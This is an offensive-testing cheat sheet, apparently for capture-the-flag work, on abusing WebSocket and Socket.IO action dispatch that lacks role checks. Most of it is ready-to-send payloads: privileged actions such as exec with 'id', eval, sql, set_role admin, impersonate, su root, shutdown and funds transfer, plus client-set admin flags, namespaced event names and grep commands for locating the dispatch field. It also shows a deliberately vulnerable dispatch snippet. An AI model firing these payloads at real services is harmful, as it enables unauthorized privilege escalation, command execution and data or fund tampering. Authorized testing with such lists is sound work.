# Action dispatch (deep) — the privileged-action surface, complete

## The dispatch model

```python
HANDLERS = {'ping': ping, 'data': get_data, 'admin': admin_panel,
            'debug': debug, 'eval': do_eval, 'broadcast': broadcast,
            'flag': get_flag, 'config': set_config, ...}
async for msg in websocket:
    handler = HANDLERS.get(msg['action'])
    if handler: await handler(msg)      # NO role check on the dispatch
```

The `HANDLERS` map accepts the FULL action set — the UI shows a subset.
A privileged action's handler runs without a role check.

## The action inventory — the complete set to probe

```json
{"action":"ping"} {"action":"pong"} {"action":"echo"}
{"action":"data"} {"action":"get"}  {"action":"read"}  {"action":"list"}
{"action":"admin"} {"action":"debug"} {"action":"internal"} {"action":"system"}
{"action":"eval","code":"x"} {"action":"exec","cmd":"id"} {"action":"sql","q":"x"}
{"action":"flag"} {"action":"secret"} {"action":"config","key":"x"}
{"action":"broadcast","text":"x"} {"action":"announce","msg":"x"}
{"action":"set_role","role":"admin"} {"action":"impersonate","user":"admin"}
{"action":"grant","perm":"admin"} {"action":"reset","user":"admin"}
{"action":"dump"} {"action":"export"} {"action":"backup"} {"action":"metrics"}
{"action":"reload"} {"action":"shutdown"} {"action":"migrate"} {"action":"seed"}
{"action":"su","user":"root"} {"action":"login_as","user":"admin"}
{"action":"override"} {"action":"bypass"} {"action":"unlock"} {"action":"verify"}
```

## The field that dispatches — hunt the real name

```bash
# the bundle's dispatch field — not always 'action'
grep -riE '"(action|type|event|cmd|command|method|op|operation|verb|kind|do)"\s*[:=]' /tmp/bundle
grep -riE '\.(emit|send|publish|call|invoke)\(' /tmp/bundle
```

`action`/`type`/`event`/`cmd`/`command`/`method`/`op`/`operation`/`verb`/
`kind`/`do`/`fn`/`handler`/`route`/`name`/`call` — the dispatch key.

## The Socket.IO event-dispatch

```text
42["ping"]
42["admin",{}]
42["debug",{"cmd":"x"}]
42["eval",{"code":"x"}]
42["internal",{...}]
42["system",{"cmd":"flag"}]
```

The `42["event",data]` — the EVENT NAME is the dispatch key; a privileged
event-name (`admin`/`debug`/`internal`/`system`/`flag`) is the action-gap.

## The role/permission fields — the self-grant surface

```json
{"action":"admin","role":"admin"}
{"action":"x","user":{"role":"admin"}}
{"action":"x","perm":["admin"],"scope":"*"}
{"action":"x","is_admin":true,"debug":true}
{"action":"x","internal":true,"privileged":true}
{"action":"x","admin":true,"sudo":true}
{"action":"x","level":9,"tier":"staff"}
```

A `role`/`perm`/`is_admin`/`debug`/`internal`/`privileged`/`admin`/`sudo`/
`scope`/`level`/`tier` field the client sets — a self-granted privilege.

## The dispatch-by-side-effect — the silent action

```json
{"action":"transfer","to":"me","amount":N}
{"action":"grant","perm":"admin"}
{"action":"reset","user":"admin"}
{"action":"broadcast","text":"x"}
{"action":"delete","id":"<other>"}
```

A state-changing action that replies `{"status":"ok"}` or nothing —
confirm by a second read (`{"action":"balance"}`/the HTTP state). The
side-effect is the impact.

## The namespace/action prefix

```text
42["admin:flag",{}]         42["internal:cmd",{}]
42["system:exec",{...}]      42["debug:dump",{}]
{"action":"admin:flag"}      {"action":"system.exec"}
{"type":"internal/cmd"}      {"event":"admin.flag"}
```

A namespaced action — `admin:x`/`internal:x`/`system.x`/`debug/x` — the
privileged prefix; probe each namespace.

## The dispatch verdict + record

`oracle: action:<name>: <the privileged reply/state-change>` — the
verbatim reply or the confirmed state-change; a uniform
`{"error":"unknown action"}`/`{"error":"forbidden"}` is the negative.
